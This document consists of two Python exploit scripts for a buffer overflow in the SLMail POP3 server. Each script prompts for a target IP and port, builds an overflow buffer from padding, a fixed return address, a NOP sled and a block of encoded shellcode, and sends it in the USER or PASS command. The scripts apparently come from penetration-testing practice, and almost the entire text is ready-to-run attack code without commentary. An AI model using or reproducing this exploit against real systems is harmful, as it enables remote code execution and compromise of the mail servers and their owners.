#!/usr/bin/python3

import sys,socket

print("*******Slmail buffer overflow********")
ip_address=input("Enter the IP address\n")
port=input("Enter the port numeber\n")


if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*30)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*30)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*30)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*30)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port)>0):
    buf =  b""
    buf += b"\xbe\xab\xab\x70\xc4\xda\xd9\xd9\x74\x24\xf4\x58"
    buf += b"\x31\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x0e\x03\xdb"
    buf += b"\xa5\x92\x31\xe7\x52\xd0\xba\x17\xa3\xb5\x33\xf2"
    buf += b"\x92\xf5\x20\x77\x84\xc5\x23\xd5\x29\xad\x66\xcd"
    buf += b"\xba\xc3\xae\xe2\x0b\x69\x89\xcd\x8c\xc2\xe9\x4c"
    buf += b"\x0f\x19\x3e\xae\x2e\xd2\x33\xaf\x77\x0f\xb9\xfd"
    buf += b"\x20\x5b\x6c\x11\x44\x11\xad\x9a\x16\xb7\xb5\x7f"
    buf += b"\xee\xb6\x94\x2e\x64\xe1\x36\xd1\xa9\x99\x7e\xc9"
    buf += b"\xae\xa4\xc9\x62\x04\x52\xc8\xa2\x54\x9b\x67\x8b"
    buf += b"\x58\x6e\x79\xcc\x5f\x91\x0c\x24\x9c\x2c\x17\xf3"
    buf += b"\xde\xea\x92\xe7\x79\x78\x04\xc3\x78\xad\xd3\x80"
    buf += b"\x77\x1a\x97\xce\x9b\x9d\x74\x65\xa7\x16\x7b\xa9"
    buf += b"\x21\x6c\x58\x6d\x69\x36\xc1\x34\xd7\x99\xfe\x26"
    buf += b"\xb8\x46\x5b\x2d\x55\x92\xd6\x6c\x32\x57\xdb\x8e"
    buf += b"\xc2\xff\x6c\xfd\xf0\xa0\xc6\x69\xb9\x29\xc1\x6e"
    buf += b"\xbe\x03\xb5\xe0\x41\xac\xc6\x29\x86\xf8\x96\x41"
    buf += b"\x2f\x81\x7c\x91\xd0\x54\xd2\xc1\x7e\x07\x93\xb1"
    buf += b"\x3e\xf7\x7b\xdb\xb0\x28\x9b\xe4\x1a\x41\x36\x1f"
    buf += b"\xcd\xae\x6f\x7b\xeb\x47\x72\x83\xec\x07\xfb\x65"
    buf += b"\x78\x38\xaa\x3e\x15\xa1\xf7\xb4\x84\x2e\x22\xb1"
    buf += b"\x87\xa5\xc1\x46\x49\x4e\xaf\x54\x3e\xbe\xfa\x06"
    buf += b"\xe9\xc1\xd0\x2e\x75\x53\xbf\xae\xf0\x48\x68\xf9"
    buf += b"\x55\xbe\x61\x6f\x48\x99\xdb\x8d\x91\x7f\x23\x15"
    buf += b"\x4e\xbc\xaa\x94\x03\xf8\x88\x86\xdd\x01\x95\xf2"
    buf += b"\xb1\x57\x43\xac\x77\x0e\x25\x06\x2e\xfd\xef\xce"
    buf += b"\xb7\xcd\x2f\x88\xb7\x1b\xc6\x74\x09\xf2\x9f\x8b"
    buf += b"\xa6\x92\x17\xf4\xda\x02\xd7\x2f\x5f\x22\x3a\xe5"
    buf += b"\xaa\xcb\xe3\x6c\x17\x96\x13\x5b\x54\xaf\x97\x69"
    buf += b"\x25\x54\x87\x18\x20\x10\x0f\xf1\x58\x09\xfa\xf5"
    buf += b"\xcf\x2a\x2f"

    buffer=b"A" * 558 + b"\x8F\x35\x4A\x5F" + b"\x90"*16 + buf 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address,int(port)))
    s.send(b"USER HRISHI" + b"\r\n")
    s.send(b"USER " + buffer + b"\r\n")
    s.close()

----------------------------------------------------------------------------------------------------------------------------------------------------------------
#!/usr/bin/python3

import sys,socket

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

if len(ip_address)==0 or len(port_number)==0:
    if len(ip_address)>0 and len(port_number)==0:
        print("*"*50)
        print("Port number field is empty")
    elif len(ip_address)==0 and len(port_number)>0:
        print("*"*50)
        print("IP address field is empty")
    elif len(ip_address)==0 and len(port_number)==0:
        print("*"*50)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*50)
        print("Issues with the user input")
elif len(ip_address)>0 and len(port_number)>0:
    if not port_number.isdigit():

        print("*"*50)
        print("Port number field must contain only numeric digits")
    else:
        buf =  b""
        buf += b"\xba\xd3\xfe\xe7\x1b\xda\xc9\xd9\x74\x24\xf4\x5d"
        buf += b"\x31\xc9\xb1\x52\x31\x55\x12\x03\x55\x12\x83\x3e"
        buf += b"\x02\x05\xee\x3c\x13\x48\x11\xbc\xe4\x2d\x9b\x59"
        buf += b"\xd5\x6d\xff\x2a\x46\x5e\x8b\x7e\x6b\x15\xd9\x6a"
        buf += b"\xf8\x5b\xf6\x9d\x49\xd1\x20\x90\x4a\x4a\x10\xb3"
        buf += b"\xc8\x91\x45\x13\xf0\x59\x98\x52\x35\x87\x51\x06"
        buf += b"\xee\xc3\xc4\xb6\x9b\x9e\xd4\x3d\xd7\x0f\x5d\xa2"
        buf += b"\xa0\x2e\x4c\x75\xba\x68\x4e\x74\x6f\x01\xc7\x6e"
        buf += b"\x6c\x2c\x91\x05\x46\xda\x20\xcf\x96\x23\x8e\x2e"
        buf += b"\x17\xd6\xce\x77\x90\x09\xa5\x81\xe2\xb4\xbe\x56"
        buf += b"\x98\x62\x4a\x4c\x3a\xe0\xec\xa8\xba\x25\x6a\x3b"
        buf += b"\xb0\x82\xf8\x63\xd5\x15\x2c\x18\xe1\x9e\xd3\xce"
        buf += b"\x63\xe4\xf7\xca\x28\xbe\x96\x4b\x95\x11\xa6\x8b"
        buf += b"\x76\xcd\x02\xc0\x9b\x1a\x3f\x8b\xf3\xef\x72\x33"
        buf += b"\x04\x78\x04\x40\x36\x27\xbe\xce\x7a\xa0\x18\x09"
        buf += b"\x7c\x9b\xdd\x85\x83\x24\x1e\x8c\x47\x70\x4e\xa6"
        buf += b"\x6e\xf9\x05\x36\x8e\x2c\x89\x66\x20\x9f\x6a\xd6"
        buf += b"\x80\x4f\x03\x3c\x0f\xaf\x33\x3f\xc5\xd8\xde\xba"
        buf += b"\x8e\x26\xb6\xa0\xa6\xcf\xc5\x28\x34\xe2\x43\xce"
        buf += b"\x50\x12\x02\x59\xcd\x8b\x0f\x11\x6c\x53\x9a\x5c"
        buf += b"\xae\xdf\x29\xa1\x61\x28\x47\xb1\x16\xd8\x12\xeb"
        buf += b"\xb1\xe7\x88\x83\x5e\x75\x57\x53\x28\x66\xc0\x04"
        buf += b"\x7d\x58\x19\xc0\x93\xc3\xb3\xf6\x69\x95\xfc\xb2"
        buf += b"\xb5\x66\x02\x3b\x3b\xd2\x20\x2b\x85\xdb\x6c\x1f"
        buf += b"\x59\x8a\x3a\xc9\x1f\x64\x8d\xa3\xc9\xdb\x47\x23"
        buf += b"\x8f\x17\x58\x35\x90\x7d\x2e\xd9\x21\x28\x77\xe6"
        buf += b"\x8e\xbc\x7f\x9f\xf2\x5c\x7f\x4a\xb7\x7d\x62\x5e"
        buf += b"\xc2\x15\x3b\x0b\x6f\x78\xbc\xe6\xac\x85\x3f\x02"
        buf += b"\x4d\x72\x5f\x67\x48\x3e\xe7\x94\x20\x2f\x82\x9a"
        buf += b"\x97\x50\x87"


        buffer_size=b"A" * 2606 + b"\x8F\x35\x4A\x5F" + b"\x90" * 16 + buf 
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address,int(port_number)))
        s.send(b"USER HRISHI" + b"\r\n")
        s.send(b"PASS " +  buffer_size + b"\r\n")
        s.close
